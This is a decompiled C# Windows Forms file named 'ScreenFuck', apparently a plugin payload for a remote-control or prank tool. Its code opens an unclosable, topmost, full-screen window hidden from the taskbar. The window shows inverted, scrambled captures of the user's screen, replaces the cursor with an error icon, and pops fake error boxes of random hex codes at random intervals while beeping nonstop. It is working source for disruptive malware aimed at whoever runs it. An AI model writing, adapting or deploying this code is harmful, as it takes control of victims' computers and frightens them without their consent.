using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Plugin.Properties;

namespace ScreenFuck;

public class Form1 : Form
{
	public CancellationTokenSource cancellationToken = new CancellationTokenSource();

	public string system16 = "1234567890ABCDEF";

	public Random random = new Random();

	private IContainer components;

	private Timer timer1;

	private ImageList imageList1;

	private PictureBox pictureBox1;

	private PictureBox pictureBox2;

	private Timer timer2;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		new Thread((ThreadStart)delegate
		{
			Play();
		}).Start();
		timer1.Enabled = true;
		timer1.Start();
		timer2.Enabled = true;
		timer2.Start();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = !cancellationToken.IsCancellationRequested;
	}

	public static Cursor CreateCursor(Bitmap bm, Size size)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Expected O, but got Unknown
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		bm = new Bitmap((Image)(object)bm, size);
		return new Cursor(bm.GetHicon());
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		//IL_0179: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		((Form)this).WindowState = (FormWindowState)2;
		Random obj = new Random();
		int num = obj.Next(0, 150);
		int num2 = obj.Next(0, 150);
		int num3 = obj.Next(0, 150);
		int num4 = obj.Next(0, 150);
		Bitmap val = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Width);
		Graphics obj2 = Graphics.FromImage((Image)(object)val);
		obj2.CopyFromScreen(num, num4, num2, num3, ((Image)val).Size);
		obj2.CopyFromScreen(num4, num3, num, num2, ((Image)val).Size);
		int num5 = obj.Next(500, 1500);
		int num6 = obj.Next(250, 800);
		for (int i = 0; i < num6; i++)
		{
			for (int j = 0; j < num5; j++)
			{
				Color pixel = val.GetPixel(j, i);
				int a = pixel.A;
				int r = pixel.R;
				int g = pixel.G;
				int b = pixel.B;
				r = 255 - r;
				g = 255 - g;
				b = 255 - b;
				val.SetPixel(j, i, Color.FromArgb(a, r, g, b));
			}
			((Control)pictureBox2).Location = Cursor.Position;
			pictureBox1.Image = (Image)(object)val;
		}
		((Control)this).Cursor = CreateCursor((Bitmap)imageList1.Images[0], new Size(32, 32));
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(GetSystemRandom(), GetSystemRandom(), (MessageBoxButtons)0, (MessageBoxIcon)16);
		timer2.Interval = random.Next(100, 5000);
	}

	public void Play()
	{
		while (!cancellationToken.IsCancellationRequested)
		{
			Console.Beep(random.Next(500, 3000), random.Next(100, 1000));
		}
	}

	public string GetSystemRandom()
	{
		string text = "";
		for (int i = 0; i < random.Next(1, 10); i++)
		{
			text = text + GetSystem16Random() + " ";
		}
		return text;
	}

	public void Stop()
	{
		cancellationToken.Cancel();
		((Control)this).Hide();
		timer1.Enabled = false;
		timer1.Stop();
		timer2.Enabled = false;
		timer2.Stop();
		((Form)this).Close();
	}

	public string GetSystem16Random()
	{
		string text = "0x";
		for (int i = 0; i < 8; i++)
		{
			text += system16[random.Next(system16.Length)];
		}
		return text;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_0261: Unknown result type (might be due to invalid IL or missing references)
		//IL_026b: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		timer1 = new Timer(components);
		imageList1 = new ImageList(components);
		pictureBox1 = new PictureBox();
		pictureBox2 = new PictureBox();
		timer2 = new Timer(components);
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		timer1.Tick += timer1_Tick;
		imageList1.ImageStream = (ImageListStreamer)componentResourceManager.GetObject("imageList1.ImageStream");
		imageList1.TransparentColor = Color.Transparent;
		imageList1.Images.SetKeyName(0, "error.png");
		((Control)pictureBox1).Location = new Point(-1, 0);
		((Control)pictureBox1).Name = "pictureBox1";
		((Control)pictureBox1).Size = new Size(1920, 1080);
		pictureBox1.TabIndex = 0;
		pictureBox1.TabStop = false;
		pictureBox2.Image = (Image)(object)Resource1.alert;
		((Control)pictureBox2).Location = new Point(-1, 0);
		((Control)pictureBox2).Name = "pictureBox2";
		((Control)pictureBox2).Size = new Size(32, 32);
		pictureBox2.SizeMode = (PictureBoxSizeMode)1;
		pictureBox2.TabIndex = 1;
		pictureBox2.TabStop = false;
		timer2.Interval = 5000;
		timer2.Tick += timer2_Tick;
		((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Control)this).BackColor = Color.White;
		((Form)this).ClientSize = new Size(33, 35);
		((Form)this).ControlBox = false;
		((Control)this).Controls.Add((Control)(object)pictureBox2);
		((Control)this).Controls.Add((Control)(object)pictureBox1);
		((Form)this).FormBorderStyle = (FormBorderStyle)0;
		((Control)this).Name = "Form1";
		((Form)this).ShowInTaskbar = false;
		((Control)this).Text = "Form1";
		((Form)this).TopMost = true;
		((Form)this).TransparencyKey = Color.Transparent;
		((Form)this).WindowState = (FormWindowState)2;
		((Form)this).FormClosing += new FormClosingEventHandler(Form1_FormClosing);
		((Form)this).Load += Form1_Load;
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
